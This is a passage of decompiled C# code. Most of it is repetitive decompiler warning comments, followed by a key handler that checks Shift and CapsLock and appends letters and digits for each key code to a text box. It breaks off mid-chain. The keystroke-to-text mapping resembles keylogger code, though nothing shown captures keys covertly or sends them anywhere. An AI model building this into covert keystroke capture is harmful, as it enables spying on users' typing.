		//IL_1acb: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ace: Invalid comparison between Unknown and I4
		//IL_1af7: Unknown result type (might be due to invalid IL or missing references)
		//IL_1afa: Invalid comparison between Unknown and I4
		//IL_1b23: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b26: Invalid comparison between Unknown and I4
		//IL_1b5d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b5f: Invalid comparison between Unknown and I4
		//IL_1b96: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b99: Invalid comparison between Unknown and I4
		//IL_1bc2: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bc5: Invalid comparison between Unknown and I4
		//IL_1bee: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bf1: Invalid comparison between Unknown and I4
		//IL_1c1a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c1d: Invalid comparison between Unknown and I4
		//IL_1c46: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c49: Invalid comparison between Unknown and I4
		//IL_1c72: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c75: Invalid comparison between Unknown and I4
		//IL_1c9e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ca1: Invalid comparison between Unknown and I4
		//IL_1cca: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ccd: Invalid comparison between Unknown and I4
		//IL_1cf6: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cf9: Invalid comparison between Unknown and I4
		//IL_1d22: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d25: Invalid comparison between Unknown and I4
		//IL_1d4e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d51: Invalid comparison between Unknown and I4
		//IL_1d7a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d7d: Invalid comparison between Unknown and I4
		//IL_1dcd: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dd0: Invalid comparison between Unknown and I4
		//IL_1df9: Unknown result type (might be due to invalid IL or missing references)
		//IL_1dfc: Invalid comparison between Unknown and I4
		//IL_1e25: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e28: Invalid comparison between Unknown and I4
		//IL_1e51: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e54: Invalid comparison between Unknown and I4
		//IL_1e7d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e80: Invalid comparison between Unknown and I4
		//IL_1ea9: Unknown result type (might be due to invalid IL or missing references)
		//IL_1eac: Invalid comparison between Unknown and I4
		//IL_1ed5: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ed8: Invalid comparison between Unknown and I4
		//IL_1f01: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f04: Invalid comparison between Unknown and I4
		//IL_1f2d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f30: Invalid comparison between Unknown and I4
		//IL_1f59: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f5c: Invalid comparison between Unknown and I4
		//IL_1f85: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f88: Invalid comparison between Unknown and I4
		//IL_1fb1: Unknown result type (might be due to invalid IL or missing references)
		//IL_1fb4: Invalid comparison between Unknown and I4
		//IL_1fdd: Unknown result type (might be due to invalid IL or missing references)
		//IL_1fe0: Invalid comparison between Unknown and I4
		//IL_2009: Unknown result type (might be due to invalid IL or missing references)
		//IL_200c: Invalid comparison between Unknown and I4
		//IL_2035: Unknown result type (might be due to invalid IL or missing references)
		//IL_2038: Invalid comparison between Unknown and I4
		//IL_2061: Unknown result type (might be due to invalid IL or missing references)
		//IL_2064: Invalid comparison between Unknown and I4
		//IL_208d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2090: Invalid comparison between Unknown and I4
		//IL_20b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_20bc: Invalid comparison between Unknown and I4
		//IL_20e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_20e8: Invalid comparison between Unknown and I4
		//IL_2111: Unknown result type (might be due to invalid IL or missing references)
		//IL_2114: Invalid comparison between Unknown and I4
		//IL_213d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2140: Invalid comparison between Unknown and I4
		//IL_2169: Unknown result type (might be due to invalid IL or missing references)
		//IL_216c: Invalid comparison between Unknown and I4
		//IL_2195: Unknown result type (might be due to invalid IL or missing references)
		//IL_2198: Invalid comparison between Unknown and I4
		//IL_21c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_21c4: Invalid comparison between Unknown and I4
		//IL_21ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_21f0: Invalid comparison between Unknown and I4
		//IL_2219: Unknown result type (might be due to invalid IL or missing references)
		//IL_221c: Invalid comparison between Unknown and I4
		//IL_2245: Unknown result type (might be due to invalid IL or missing references)
		//IL_2248: Invalid comparison between Unknown and I4
		//IL_2271: Unknown result type (might be due to invalid IL or missing references)
		//IL_2274: Invalid comparison between Unknown and I4
		//IL_229d: Unknown result type (might be due to invalid IL or missing references)
		//IL_22a0: Invalid comparison between Unknown and I4
		//IL_22c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_22cc: Invalid comparison between Unknown and I4
		//IL_22f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_22f8: Invalid comparison between Unknown and I4
		//IL_2321: Unknown result type (might be due to invalid IL or missing references)
		//IL_2324: Invalid comparison between Unknown and I4
		//IL_234d: Unknown result type (might be due to invalid IL or missing references)
		//IL_2350: Invalid comparison between Unknown and I4
		//IL_2379: Unknown result type (might be due to invalid IL or missing references)
		//IL_237c: Invalid comparison between Unknown and I4
		//IL_23a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_23a8: Invalid comparison between Unknown and I4
		//IL_23d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_23d4: Invalid comparison between Unknown and I4
		//IL_23fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_2403: Invalid comparison between Unknown and I4
		//IL_242c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2432: Invalid comparison between Unknown and I4
		//IL_245b: Unknown result type (might be due to invalid IL or missing references)
		//IL_2461: Invalid comparison between Unknown and I4
		//IL_248a: Unknown result type (might be due to invalid IL or missing references)
		//IL_2490: Invalid comparison between Unknown and I4
		//IL_24b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_24bf: Invalid comparison between Unknown and I4
		//IL_24e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_24ee: Invalid comparison between Unknown and I4
		//IL_2517: Unknown result type (might be due to invalid IL or missing references)
		//IL_251d: Invalid comparison between Unknown and I4
		//IL_2546: Unknown result type (might be due to invalid IL or missing references)
		//IL_254c: Invalid comparison between Unknown and I4
		//IL_2575: Unknown result type (might be due to invalid IL or missing references)
		//IL_257b: Invalid comparison between Unknown and I4
		//IL_25a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_25aa: Invalid comparison between Unknown and I4
		//IL_25d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_25d6: Invalid comparison between Unknown and I4
		//IL_25ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_2602: Invalid comparison between Unknown and I4
		//IL_262b: Unknown result type (might be due to invalid IL or missing references)
		//IL_262e: Invalid comparison between Unknown and I4
		//IL_2657: Unknown result type (might be due to invalid IL or missing references)
		//IL_265a: Invalid comparison between Unknown and I4
		//IL_2683: Unknown result type (might be due to invalid IL or missing references)
		//IL_2686: Invalid comparison between Unknown and I4
		//IL_26af: Unknown result type (might be due to invalid IL or missing references)
		//IL_26b2: Invalid comparison between Unknown and I4
		//IL_26db: Unknown result type (might be due to invalid IL or missing references)
		//IL_26de: Invalid comparison between Unknown and I4
		//IL_2707: Unknown result type (might be due to invalid IL or missing references)
		//IL_270a: Invalid comparison between Unknown and I4
		//IL_2733: Unknown result type (might be due to invalid IL or missing references)
		//IL_2736: Invalid comparison between Unknown and I4
		//IL_275f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2762: Invalid comparison between Unknown and I4
		//IL_278b: Unknown result type (might be due to invalid IL or missing references)
		//IL_278e: Invalid comparison between Unknown and I4
		//IL_27b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_27ba: Invalid comparison between Unknown and I4
		//IL_27e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_27e6: Invalid comparison between Unknown and I4
		//IL_280f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2812: Invalid comparison between Unknown and I4
		//IL_283b: Unknown result type (might be due to invalid IL or missing references)
		//IL_283e: Invalid comparison between Unknown and I4
		//IL_2875: Unknown result type (might be due to invalid IL or missing references)
		//IL_2877: Invalid comparison between Unknown and I4
		//IL_28ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_28b1: Invalid comparison between Unknown and I4
		//IL_28da: Unknown result type (might be due to invalid IL or missing references)
		//IL_28dd: Invalid comparison between Unknown and I4
		//IL_2906: Unknown result type (might be due to invalid IL or missing references)
		//IL_2909: Invalid comparison between Unknown and I4
		//IL_2932: Unknown result type (might be due to invalid IL or missing references)
		//IL_2935: Invalid comparison between Unknown and I4
		//IL_295e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2961: Invalid comparison between Unknown and I4
		//IL_298a: Unknown result type (might be due to invalid IL or missing references)
		//IL_298d: Invalid comparison between Unknown and I4
		//IL_29b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_29b9: Invalid comparison between Unknown and I4
		//IL_29e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_29e5: Invalid comparison between Unknown and I4
		//IL_2a0e: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a11: Invalid comparison between Unknown and I4
		//IL_2a3a: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a3d: Invalid comparison between Unknown and I4
		//IL_2a66: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a69: Invalid comparison between Unknown and I4
		//IL_2a92: Unknown result type (might be due to invalid IL or missing references)
		//IL_2a95: Invalid comparison between Unknown and I4
		//IL_2ae8: Unknown result type (might be due to invalid IL or missing references)
		//IL_2aeb: Invalid comparison between Unknown and I4
		//IL_2b14: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b17: Invalid comparison between Unknown and I4
		//IL_2b40: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b43: Invalid comparison between Unknown and I4
		//IL_2b6c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b6f: Invalid comparison between Unknown and I4
		//IL_2b98: Unknown result type (might be due to invalid IL or missing references)
		//IL_2b9b: Invalid comparison between Unknown and I4
		//IL_2bc4: Unknown result type (might be due to invalid IL or missing references)
		//IL_2bc7: Invalid comparison between Unknown and I4
		//IL_2bf0: Unknown result type (might be due to invalid IL or missing references)
		//IL_2bf3: Invalid comparison between Unknown and I4
		//IL_2c1c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c1f: Invalid comparison between Unknown and I4
		//IL_2c48: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c4b: Invalid comparison between Unknown and I4
		//IL_2c74: Unknown result type (might be due to invalid IL or missing references)
		//IL_2c77: Invalid comparison between Unknown and I4
		//IL_2ca0: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ca3: Invalid comparison between Unknown and I4
		//IL_2ccc: Unknown result type (might be due to invalid IL or missing references)
		//IL_2ccf: Invalid comparison between Unknown and I4
		//IL_2cf8: Unknown result type (might be due to invalid IL or missing references)
		//IL_2cfb: Invalid comparison between Unknown and I4
		//IL_2d24: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d27: Invalid comparison between Unknown and I4
		//IL_2d50: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d53: Invalid comparison between Unknown and I4
		//IL_2d7c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2d7f: Invalid comparison between Unknown and I4
		//IL_2da8: Unknown result type (might be due to invalid IL or missing references)
		//IL_2dab: Invalid comparison between Unknown and I4
		//IL_2dd4: Unknown result type (might be due to invalid IL or missing references)
		//IL_2dd7: Invalid comparison between Unknown and I4
		//IL_2e00: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e03: Invalid comparison between Unknown and I4
		//IL_2e2c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e2f: Invalid comparison between Unknown and I4
		//IL_2e58: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e5b: Invalid comparison between Unknown and I4
		//IL_2e84: Unknown result type (might be due to invalid IL or missing references)
		//IL_2e87: Invalid comparison between Unknown and I4
		//IL_2eb0: Unknown result type (might be due to invalid IL or missing references)
		//IL_2eb3: Invalid comparison between Unknown and I4
		//IL_2edc: Unknown result type (might be due to invalid IL or missing references)
		//IL_2edf: Invalid comparison between Unknown and I4
		//IL_2f08: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f0b: Invalid comparison between Unknown and I4
		//IL_2f34: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f37: Invalid comparison between Unknown and I4
		//IL_2f60: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f63: Invalid comparison between Unknown and I4
		//IL_2f8c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2f8f: Invalid comparison between Unknown and I4
		//IL_2fb8: Unknown result type (might be due to invalid IL or missing references)
		//IL_2fbb: Invalid comparison between Unknown and I4
		//IL_2fe4: Unknown result type (might be due to invalid IL or missing references)
		//IL_2fe7: Invalid comparison between Unknown and I4
		//IL_3010: Unknown result type (might be due to invalid IL or missing references)
		//IL_3013: Invalid comparison between Unknown and I4
		//IL_303c: Unknown result type (might be due to invalid IL or missing references)
		//IL_303f: Invalid comparison between Unknown and I4
		//IL_3068: Unknown result type (might be due to invalid IL or missing references)
		//IL_306b: Invalid comparison between Unknown and I4
		//IL_3094: Unknown result type (might be due to invalid IL or missing references)
		//IL_3097: Invalid comparison between Unknown and I4
		//IL_30c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_30c3: Invalid comparison between Unknown and I4
		//IL_30ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_30ef: Invalid comparison between Unknown and I4
		//IL_3118: Unknown result type (might be due to invalid IL or missing references)
		//IL_311e: Invalid comparison between Unknown and I4
		//IL_3147: Unknown result type (might be due to invalid IL or missing references)
		//IL_314d: Invalid comparison between Unknown and I4
		//IL_3176: Unknown result type (might be due to invalid IL or missing references)
		//IL_317c: Invalid comparison between Unknown and I4
		//IL_31a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_31ab: Invalid comparison between Unknown and I4
		//IL_31d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_31da: Invalid comparison between Unknown and I4
		//IL_3203: Unknown result type (might be due to invalid IL or missing references)
		//IL_3209: Invalid comparison between Unknown and I4
		//IL_3232: Unknown result type (might be due to invalid IL or missing references)
		//IL_3238: Invalid comparison between Unknown and I4
		//IL_3261: Unknown result type (might be due to invalid IL or missing references)
		//IL_3267: Invalid comparison between Unknown and I4
		//IL_3290: Unknown result type (might be due to invalid IL or missing references)
		//IL_3296: Invalid comparison between Unknown and I4
		//IL_32bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_32c5: Invalid comparison between Unknown and I4
		//IL_32ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_32f1: Invalid comparison between Unknown and I4
		//IL_331a: Unknown result type (might be due to invalid IL or missing references)
		//IL_331d: Invalid comparison between Unknown and I4
		//IL_3346: Unknown result type (might be due to invalid IL or missing references)
		//IL_3349: Invalid comparison between Unknown and I4
		//IL_3372: Unknown result type (might be due to invalid IL or missing references)
		//IL_3375: Invalid comparison between Unknown and I4
		//IL_339e: Unknown result type (might be due to invalid IL or missing references)
		//IL_33a1: Invalid comparison between Unknown and I4
		//IL_33ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_33cd: Invalid comparison between Unknown and I4
		//IL_33f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_33f9: Invalid comparison between Unknown and I4
		//IL_3422: Unknown result type (might be due to invalid IL or missing references)
		//IL_3425: Invalid comparison between Unknown and I4
		//IL_344e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3451: Invalid comparison between Unknown and I4
		//IL_347a: Unknown result type (might be due to invalid IL or missing references)
		//IL_347d: Invalid comparison between Unknown and I4
		//IL_34a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_34a9: Invalid comparison between Unknown and I4
		//IL_34d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_34d5: Invalid comparison between Unknown and I4
		//IL_34fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_3501: Invalid comparison between Unknown and I4
		//IL_352a: Unknown result type (might be due to invalid IL or missing references)
		//IL_352d: Invalid comparison between Unknown and I4
		//IL_3556: Unknown result type (might be due to invalid IL or missing references)
		//IL_3559: Invalid comparison between Unknown and I4
		//IL_3590: Unknown result type (might be due to invalid IL or missing references)
		//IL_3592: Invalid comparison between Unknown and I4
		//IL_35c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_35cc: Invalid comparison between Unknown and I4
		//IL_35f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_35f8: Invalid comparison between Unknown and I4
		//IL_3621: Unknown result type (might be due to invalid IL or missing references)
		//IL_3624: Invalid comparison between Unknown and I4
		//IL_364d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3650: Invalid comparison between Unknown and I4
		//IL_3679: Unknown result type (might be due to invalid IL or missing references)
		//IL_367c: Invalid comparison between Unknown and I4
		//IL_36a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_36a8: Invalid comparison between Unknown and I4
		//IL_36d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_36d4: Invalid comparison between Unknown and I4
		//IL_36fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_3700: Invalid comparison between Unknown and I4
		//IL_3729: Unknown result type (might be due to invalid IL or missing references)
		//IL_372c: Invalid comparison between Unknown and I4
		//IL_3755: Unknown result type (might be due to invalid IL or missing references)
		//IL_3758: Invalid comparison between Unknown and I4
		//IL_3781: Unknown result type (might be due to invalid IL or missing references)
		//IL_3784: Invalid comparison between Unknown and I4
		//IL_37ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_37b0: Invalid comparison between Unknown and I4
		//IL_3803: Unknown result type (might be due to invalid IL or missing references)
		//IL_3806: Invalid comparison between Unknown and I4
		//IL_382f: Unknown result type (might be due to invalid IL or missing references)
		//IL_3832: Invalid comparison between Unknown and I4
		//IL_385b: Unknown result type (might be due to invalid IL or missing references)
		//IL_385e: Invalid comparison between Unknown and I4
		//IL_3887: Unknown result type (might be due to invalid IL or missing references)
		//IL_388a: Invalid comparison between Unknown and I4
		//IL_38b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_38b6: Invalid comparison between Unknown and I4
		//IL_38df: Unknown result type (might be due to invalid IL or missing references)
		//IL_38e2: Invalid comparison between Unknown and I4
		//IL_390b: Unknown result type (might be due to invalid IL or missing references)
		//IL_390e: Invalid comparison between Unknown and I4
		//IL_3937: Unknown result type (might be due to invalid IL or missing references)
		//IL_393a: Invalid comparison between Unknown and I4
		//IL_3963: Unknown result type (might be due to invalid IL or missing references)
		//IL_3966: Invalid comparison between Unknown and I4
		//IL_398f: Unknown result type (might be due to invalid IL or missing references)
		//IL_3992: Invalid comparison between Unknown and I4
		//IL_39bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_39be: Invalid comparison between Unknown and I4
		//IL_39e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_39ea: Invalid comparison between Unknown and I4
		//IL_3a13: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a16: Invalid comparison between Unknown and I4
		//IL_3a3f: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a42: Invalid comparison between Unknown and I4
		//IL_3a6b: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a6e: Invalid comparison between Unknown and I4
		//IL_3a97: Unknown result type (might be due to invalid IL or missing references)
		//IL_3a9a: Invalid comparison between Unknown and I4
		//IL_3ac3: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ac6: Invalid comparison between Unknown and I4
		//IL_3aef: Unknown result type (might be due to invalid IL or missing references)
		//IL_3af2: Invalid comparison between Unknown and I4
		//IL_3b1b: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b1e: Invalid comparison between Unknown and I4
		//IL_3b47: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b4a: Invalid comparison between Unknown and I4
		//IL_3b73: Unknown result type (might be due to invalid IL or missing references)
		//IL_3b76: Invalid comparison between Unknown and I4
		//IL_3b9f: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ba2: Invalid comparison between Unknown and I4
		//IL_3bcb: Unknown result type (might be due to invalid IL or missing references)
		//IL_3bce: Invalid comparison between Unknown and I4
		//IL_3bf7: Unknown result type (might be due to invalid IL or missing references)
		//IL_3bfa: Invalid comparison between Unknown and I4
		//IL_3c23: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c26: Invalid comparison between Unknown and I4
		//IL_3c4f: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c52: Invalid comparison between Unknown and I4
		//IL_3c7b: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c7e: Invalid comparison between Unknown and I4
		//IL_3ca7: Unknown result type (might be due to invalid IL or missing references)
		//IL_3caa: Invalid comparison between Unknown and I4
		//IL_3cd3: Unknown result type (might be due to invalid IL or missing references)
		//IL_3cd6: Invalid comparison between Unknown and I4
		//IL_3cff: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d02: Invalid comparison between Unknown and I4
		//IL_3d2b: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d2e: Invalid comparison between Unknown and I4
		//IL_3d57: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d5a: Invalid comparison between Unknown and I4
		//IL_3d83: Unknown result type (might be due to invalid IL or missing references)
		//IL_3d86: Invalid comparison between Unknown and I4
		//IL_3daf: Unknown result type (might be due to invalid IL or missing references)
		//IL_3db2: Invalid comparison between Unknown and I4
		//IL_3ddb: Unknown result type (might be due to invalid IL or missing references)
		//IL_3dde: Invalid comparison between Unknown and I4
		//IL_3e07: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e0a: Invalid comparison between Unknown and I4
		//IL_3e33: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e39: Invalid comparison between Unknown and I4
		//IL_3e62: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e68: Invalid comparison between Unknown and I4
		//IL_3e91: Unknown result type (might be due to invalid IL or missing references)
		//IL_3e97: Invalid comparison between Unknown and I4
		//IL_3ec0: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ec6: Invalid comparison between Unknown and I4
		//IL_3eef: Unknown result type (might be due to invalid IL or missing references)
		//IL_3ef5: Invalid comparison between Unknown and I4
		//IL_3f1e: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f24: Invalid comparison between Unknown and I4
		//IL_3f4d: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f53: Invalid comparison between Unknown and I4
		//IL_3f7c: Unknown result type (might be due to invalid IL or missing references)
		//IL_3f82: Invalid comparison between Unknown and I4
		//IL_3fab: Unknown result type (might be due to invalid IL or missing references)
		//IL_3fb1: Invalid comparison between Unknown and I4
		//IL_3fda: Unknown result type (might be due to invalid IL or missing references)
		//IL_3fdd: Invalid comparison between Unknown and I4
		//IL_4006: Unknown result type (might be due to invalid IL or missing references)
		//IL_4009: Invalid comparison between Unknown and I4
		//IL_4032: Unknown result type (might be due to invalid IL or missing references)
		//IL_4035: Invalid comparison between Unknown and I4
		//IL_405e: Unknown result type (might be due to invalid IL or missing references)
		//IL_4061: Invalid comparison between Unknown and I4
		//IL_408a: Unknown result type (might be due to invalid IL or missing references)
		//IL_408d: Invalid comparison between Unknown and I4
		//IL_40b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_40b9: Invalid comparison between Unknown and I4
		//IL_40e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_40e5: Invalid comparison between Unknown and I4
		//IL_410e: Unknown result type (might be due to invalid IL or missing references)
		//IL_4111: Invalid comparison between Unknown and I4
		//IL_413a: Unknown result type (might be due to invalid IL or missing references)
		//IL_413d: Invalid comparison between Unknown and I4
		//IL_4166: Unknown result type (might be due to invalid IL or missing references)
		//IL_4169: Invalid comparison between Unknown and I4
		//IL_4192: Unknown result type (might be due to invalid IL or missing references)
		//IL_4195: Invalid comparison between Unknown and I4
		//IL_41be: Unknown result type (might be due to invalid IL or missing references)
		//IL_41c1: Invalid comparison between Unknown and I4
		//IL_41ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_41ed: Invalid comparison between Unknown and I4
		//IL_4216: Unknown result type (might be due to invalid IL or missing references)
		//IL_4219: Invalid comparison between Unknown and I4
		//IL_4242: Unknown result type (might be due to invalid IL or missing references)
		//IL_4245: Invalid comparison between Unknown and I4
		//IL_427c: Unknown result type (might be due to invalid IL or missing references)
		//IL_427e: Invalid comparison between Unknown and I4
		//IL_42b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_42b8: Invalid comparison between Unknown and I4
		//IL_42e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_42e4: Invalid comparison between Unknown and I4
		//IL_430d: Unknown result type (might be due to invalid IL or missing references)
		//IL_4310: Invalid comparison between Unknown and I4
		//IL_4339: Unknown result type (might be due to invalid IL or missing references)
		//IL_433c: Invalid comparison between Unknown and I4
		//IL_4365: Unknown result type (might be due to invalid IL or missing references)
		//IL_4368: Invalid comparison between Unknown and I4
		//IL_4391: Unknown result type (might be due to invalid IL or missing references)
		//IL_4394: Invalid comparison between Unknown and I4
		//IL_43bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_43c0: Invalid comparison between Unknown and I4
		//IL_43e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_43ec: Invalid comparison between Unknown and I4
		//IL_4415: Unknown result type (might be due to invalid IL or missing references)
		//IL_4418: Invalid comparison between Unknown and I4
		//IL_4441: Unknown result type (might be due to invalid IL or missing references)
		//IL_4444: Invalid comparison between Unknown and I4
		//IL_446a: Unknown result type (might be due to invalid IL or missing references)
		//IL_446d: Invalid comparison between Unknown and I4
		//IL_4493: Unknown result type (might be due to invalid IL or missing references)
		//IL_4496: Invalid comparison between Unknown and I4
		//IL_44bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_44c2: Invalid comparison between Unknown and I4
		if (!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & !((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 65)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "a");
			}
			else if ((int)Key == 66)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "b");
			}
			else if ((int)Key == 67)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "c");
			}
			else if ((int)Key == 68)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "d");
			}
			else if ((int)Key == 69)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "e");
			}
			else if ((int)Key == 70)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "f");
			}
			else if ((int)Key == 71)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "g");
			}
			else if ((int)Key == 72)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "h");
			}
			else if ((int)Key == 73)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "i");
			}
			else if ((int)Key == 74)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "j");
			}
			else if ((int)Key == 75)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "k");
			}
			else if ((int)Key == 76)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "l");
			}
			else if ((int)Key == 77)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "m");
			}
			else if ((int)Key == 78)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "n");
			}
			else if ((int)Key == 79)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "o");
			}
			else if ((int)Key == 80)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "p");
			}
			else if ((int)Key == 81)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "q");
			}
			else if ((int)Key == 82)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "r");
			}
			else if ((int)Key == 83)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "s");
			}
			else if ((int)Key == 84)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "t");
			}
			else if ((int)Key == 85)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "u");
			}
			else if ((int)Key == 86)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "v");
			}
			else if ((int)Key == 87)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "w");
			}
			else if ((int)Key == 88)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "x");
			}
			else if ((int)Key == 89)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "y");
			}
			else if ((int)Key == 90)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "z");
			}
			else if ((int)Key == 48)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "0");
			}
			else if ((int)Key == 49)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "1");
			}
			else if ((int)Key == 50)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "2");
			}
			else if ((int)Key == 51)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "3");
			}
			else if ((int)Key == 52)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "4");
			}
			else if ((int)Key == 53)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "5");
			}
			else if ((int)Key == 54)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "6");
			}
			else if ((int)Key == 55)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "7");
			}
			else if ((int)Key == 56)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "8");
			}
